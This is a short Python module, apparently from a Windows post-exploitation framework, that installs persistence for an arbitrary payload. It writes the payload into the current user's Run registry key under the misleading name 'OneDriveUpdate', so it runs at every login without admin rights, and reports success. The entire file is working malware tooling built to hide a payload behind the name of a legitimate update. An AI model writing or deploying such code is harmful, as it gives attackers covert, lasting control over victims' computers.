import os
import _winreg
from core.prints import *
from core.utils import *

hkcurun_info = {
        "Description": "Gain persistence using HKEY_CURRENT_USER Run registry key",
		"Id" : "21",
		"Type" : "Persistence",	
		"Fixed In" : "99999",
		"Works From" : "7600",
		"Admin" : False,
		"Function Name" : "hkcu_run",
		"Function Payload" : True,
    }

def reg_create(path,payload):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,os.path.join(path),0,_winreg.KEY_ALL_ACCESS)
		_winreg.SetValueEx(key,"OneDriveUpdate",0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True

def hkcu_run(payload):
	if (reg_create("Software\Microsoft\Windows\CurrentVersion\Run",payload) == True):
		print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
		print_success("Successfully installed persistence, payload will run at login")
	else:
		print_error("Unable to install persistence")
		return False